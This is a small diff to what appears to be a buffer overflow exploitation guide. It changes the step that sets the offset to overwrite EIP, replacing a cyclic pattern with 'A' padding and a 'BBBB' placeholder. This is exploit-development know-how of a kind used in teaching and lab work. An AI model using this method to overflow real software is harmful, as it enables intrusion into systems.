@@ -36,7 +36,7 @@ Get address in EIP and find number of bytes to EIP:
 
 #### 7. Remove cyclic pattern from "overflow" and replace with "A" * offset
 ```
-offset = 634 # EIP @ 0x616A6761
+offset = 2003 # EIP @ 0x61616275
 overflow = b"A" * offset
 eip = b"BBBB" # 
 ```
